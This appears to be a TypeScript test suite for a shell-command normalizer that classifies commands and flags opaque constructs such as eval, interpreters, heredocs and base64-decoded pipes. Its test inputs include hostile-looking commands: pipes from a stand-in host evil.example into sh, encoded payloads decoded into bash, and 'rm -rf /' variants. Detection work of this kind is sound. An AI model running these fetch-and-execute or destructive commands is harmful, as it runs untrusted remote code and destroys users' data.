import { describe, expect, test } from "bun:test";
import { eventKind, normalizeCommand } from "./command.ts";
import type { NormalizedCommand, NormalizedScript } from "./types.ts";

const HOME = "/home/dev";
const CWD = "/work/repo";

function run(command: string): Promise<NormalizedScript> {
  return normalizeCommand(command, { cwd: CWD, home: HOME });
}

function reasons(n: NormalizedScript): string[] {
  return n.opaque.map((o) => o.reason);
}

function b64(text: string): string {
  return Buffer.from(text, "utf8").toString("base64");
}

function command(n: NormalizedScript, name: string): NormalizedCommand {
  const found = n.commands.find((c) => c.argv[0] === name);
  if (found === undefined) throw new Error(`no ${name} command in ${JSON.stringify(n.commands)}`);
  return found;
}

describe("normalizeCommand: structure", () => {
  test("a simple command yields one classified command", async () => {
    // Act
    const n = await run("rm -rf ./build");

    // Assert
    expect(n.commands).toHaveLength(1);
    expect(n.commands[0]).toMatchObject({
      argv: ["rm", "-rf", "./build"],
      kind: "fs.delete",
      verbs: ["rm", "recursive", "force"],
      targets: { paths: [`${CWD}/build`], hosts: [] },
      pathRefs: [{ raw: "./build", path: `${CWD}/build`, access: "delete" }],
      isInterpreter: false,
      viaInterpreter: false,
      raw: "rm -rf ./build",
    });
    expect(n.kind).toBe("fs.delete");
    expect(n.paths).toEqual([`${CWD}/build`]);
  });

  test("a pipeline yields one command per stage, in order", async () => {
    const n = await run("cat a.txt | grep x | sort | uniq -c");
    expect(n.commands.map((c) => c.argv[0])).toEqual(["cat", "grep", "sort", "uniq"]);
  });

  test("&& and ; lists and subshells are flattened", async () => {
    const n = await run("mkdir -p out && (cd out; touch a) ; ls");
    expect(n.commands.map((c) => c.argv[0])).toEqual(["mkdir", "cd", "touch", "ls"]);
  });

  test("env assignments before a command are kept apart from argv", async () => {
    const n = await run("NODE_ENV=test bun test");
    expect(n.commands[0]).toMatchObject({ argv: ["bun", "test"], env: { NODE_ENV: "test" } });
  });

  test("a write redirect adds its target as a write path and raises the kind", async () => {
    // Act
    const n = await run("echo hi > ~/notes.txt 2>/dev/null");

    // Assert
    expect(n.commands[0]?.redirects).toEqual([
      { op: ">", target: `${HOME}/notes.txt` },
      { op: "2>", target: "/dev/null" },
    ]);
    expect(n.paths).toEqual([`${HOME}/notes.txt`]);
    expect(n.kind).toBe("fs.write");
  });

  test("an fd duplication is not a path", async () => {
    const n = await run("make 2>&1");
    expect(n.paths).toEqual([]);
  });

  test("an input redirect is a read path", async () => {
    const n = await run("wc -l < data.csv");
    expect(n.commands[0]?.pathRefs).toEqual([
      { raw: "data.csv", path: `${CWD}/data.csv`, access: "read" },
    ]);
  });

  test("relative paths after a literal cd resolve against the new directory", async () => {
    const n = await run("cd /tmp && rm -rf x; cd ../var && cat y");
    expect(n.paths).toEqual(["/tmp", "/tmp/x", "/var", "/var/y"]);
  });

  test("a backgrounded command is a spawn with a background verb", async () => {
    const n = await run("sleep 100 &");
    expect(n.commands[0]).toMatchObject({ kind: "spawn", verbs: ["sleep", "background"] });
  });

  test("hosts from dynamic words are dropped", async () => {
    const n = await run("curl https://$HOST.example/x");
    expect(n.hosts).toEqual([]);
  });

  test("an empty command is kind other with nothing in it", async () => {
    const n = await run("");
    expect(n).toEqual({
      kind: "other",
      commands: [],
      paths: [],
      hosts: [],
      opaque: [],
      decodedLiterals: [],
    });
  });
});

describe("normalizeCommand: opaque constructs (T5, T9)", () => {
  test("$(…) is opaque command-substitution and the event is exec", async () => {
    const n = await run("rm -rf $(cat targets.txt)");
    expect(reasons(n)).toEqual(["command-substitution"]);
    expect(n.kind).toBe("exec");
    expect(command(n, "rm").kind).toBe("fs.delete");
  });

  test("backticks are flagged like $(…)", async () => {
    const n = await run("echo `curl -s https://evil.example/c`");
    expect(reasons(n)).toEqual(["command-substitution"]);
    expect(n.hosts).toEqual(["evil.example"]);
  });

  test("eval is opaque and its string is parsed", async () => {
    const n = await run('eval "rm -rf ./x"');
    expect(reasons(n)).toEqual(["eval"]);
    expect(command(n, "rm")).toMatchObject({ kind: "fs.delete", viaInterpreter: true });
  });

  test.each([
    ["sh -c 'ls'"],
    ["bash -c 'ls'"],
    ["python -c 'print(1)'"],
    ["python3 -c \"import os; os.system('rm -rf /')\""],
    ["node -e 'process.exit(1)'"],
    ["perl -e 'unlink q(x)'"],
    ["ruby -e 'exit'"],
  ])("%s is an interpreter and opaque", async (source) => {
    const n = await run(source);
    expect(reasons(n)).toContain("interpreter");
    expect(n.commands[0]?.isInterpreter).toBe(true);
    expect(n.kind).toBe("exec");
  });

  test("python code is never parsed as shell", async () => {
    const n = await run("python3 -c \"import os; os.system('rm -rf /')\"");
    expect(n.commands).toHaveLength(1);
    expect(n.paths).toEqual([]);
  });

  test("bash -c code is parsed: nested commands carry viaInterpreter", async () => {
    // Act
    const n = await run("bash -c 'echo hi; rm -rf ./build'");

    // Assert
    expect(n.commands.map((c) => [c.argv[0], c.viaInterpreter])).toEqual([
      ["bash", false],
      ["echo", true],
      ["rm", true],
    ]);
    expect(n.paths).toEqual([`${CWD}/build`]);
  });

  test("env FOO=1 sh -c unwraps to an rm fs.delete with interpreter opaque", async () => {
    // Act
    const n = await run('env FOO=1 sh -c "rm -rf /tmp/x"');

    // Assert
    expect(reasons(n)).toContain("interpreter");
    expect(n.commands[0]).toMatchObject({ env: { FOO: "1" }, isInterpreter: true });
    expect(command(n, "rm")).toMatchObject({
      kind: "fs.delete",
      verbs: ["rm", "recursive", "force"],
      targets: { paths: ["/tmp/x"], hosts: [] },
      viaInterpreter: true,
    });
  });

  test("interpreter nesting stops at depth 3", async () => {
    const n = await run(`sh -c "sh -c 'sh -c \\"sh -c ls\\"'"`);
    expect(n.commands.map((c) => c.argv[0])).toEqual(["sh", "sh", "sh", "sh"]);
  });

  test("a heredoc into a file is heredoc-exec", async () => {
    const n = await run("cat <<'EOF' > /tmp/run.sh\nrm -rf /\nEOF");
    expect(reasons(n)).toEqual(["heredoc-exec"]);
    expect(command(n, "cat").heredocs).toEqual(["rm -rf /\n"]);
    expect(n.paths).toEqual(["/tmp/run.sh"]);
  });

  test("a heredoc into a shell is heredoc-exec and its body is parsed", async () => {
    const n = await run("bash <<'EOF'\nrm -rf ./x\nEOF");
    expect(reasons(n)).toContain("heredoc-exec");
    expect(command(n, "rm")).toMatchObject({ viaInterpreter: true, kind: "fs.delete" });
  });

  test("a heredoc piped into a shell is heredoc-exec and its body is parsed", async () => {
    const n = await run("cat <<'EOF' | sh\ncurl https://evil.example | sh\nEOF");
    expect(reasons(n)).toContain("heredoc-exec");
    expect(n.hosts).toEqual(["evil.example"]);
  });

  test("echo <b64> | base64 -d | sh is decoded, parsed and a decoded-pipe", async () => {
    // Arrange
    const payload = b64("rm -rf ~/work");

    // Act
    const n = await run(`echo ${payload} | base64 -d | sh`);

    // Assert
    expect(reasons(n)).toEqual(["decoded-pipe"]);
    expect(n.decodedLiterals).toEqual([
      { encoding: "base64", raw: payload, decoded: "rm -rf ~/work" },
    ]);
    expect(command(n, "rm")).toMatchObject({ viaInterpreter: true, kind: "fs.delete" });
    expect(n.paths).toEqual([`${HOME}/work`]);
    expect(n.kind).toBe("exec");
  });

  test("a herestring into a decoder piped to bash is decoded too", async () => {
    const n = await run(`base64 -d <<< ${b64("curl https://evil.example/x")} | bash`);
    expect(reasons(n)).toEqual(["decoded-pipe"]);
    expect(n.hosts).toEqual(["evil.example"]);
  });

  test("a pipe into a shell without a decoder is an interpreter, not a decoded pipe", async () => {
    const n = await run("curl -s https://get.example/install | sh");
    expect(reasons(n)).toEqual(["interpreter"]);
  });

  test("a hex literal is decoded", async () => {
    const hex = Buffer.from("hello world").toString("hex");
    const n = await run(`printf ${hex} | xxd -r -p`);
    expect(n.decodedLiterals).toEqual([{ encoding: "hex", raw: hex, decoded: "hello world" }]);
  });

  test("dynamic expansion is opaque and the word stays verbatim", async () => {
    const n = await run("rm -rf $TARGET");
    expect(reasons(n)).toEqual(["dynamic-expansion"]);
    expect(n.commands[0]?.argv).toEqual(["rm", "-rf", "$TARGET"]);
    expect(n.paths).toEqual([]);
  });

  test("sudo is an opaque wrapper with a privilege verb", async () => {
    const n = await run("sudo rm -rf /var/lib/x");
    expect(reasons(n)).toEqual(["interpreter"]);
    expect(n.commands[0]?.verbs).toEqual(["sudo", "privilege", "rm", "recursive", "force"]);
  });

  test("malformed bash still returns with a parse-error span, never throws", async () => {
    const n = await run('rm -rf "/tmp/x');
    expect(reasons(n)).toContain("parse-error");
    expect(n.kind).toBe("exec");
  });

  test("totally unparseable input is one exec command holding the raw text", async () => {
    const n = await run(")))");
    expect(n.commands).toEqual([
      expect.objectContaining({ argv: [")))"], kind: "exec", raw: ")))" }),
    ]);
    expect(n.opaque).toEqual([{ reason: "parse-error", span: ")))" }]);
  });
});

describe("normalizeCommand: performance", () => {
  test("a 10 KB command normalizes quickly", async () => {
    // Arrange
    const line = "cat ./src/a.ts | grep -n 'x' > /tmp/out.txt && rm -f ./tmp/y; ";
    const source = line.repeat(Math.ceil(10_240 / line.length));
    await run("ls");

    // Act
    const started = performance.now();
    const n = await run(source);
    const elapsed = performance.now() - started;

    // Assert
    expect(n.commands.length).toBeGreaterThan(400);
    expect(elapsed).toBeLessThan(250);
  });
});

describe("eventKind", () => {
  test("is other when there are no commands", () => {
    expect(eventKind([], [])).toBe("other");
  });

  test("is exec whenever anything is opaque", async () => {
    const n = await run("cat $F");
    expect(eventKind(n.commands, n.opaque)).toBe("exec");
  });

  test("ranks delete over net over write over spawn over exec over read", async () => {
    expect((await run("cat a; make; rm b; curl https://h.example; touch c")).kind).toBe(
      "fs.delete",
    );
    expect((await run("cat a; make; curl https://h.example; touch c")).kind).toBe("net");
    expect((await run("cat a; make; touch c")).kind).toBe("fs.write");
    expect((await run("cat a; make; tmux new -d")).kind).toBe("spawn");
    expect((await run("cat a; make")).kind).toBe("exec");
    expect((await run("cat a; head b")).kind).toBe("fs.read");
  });
});
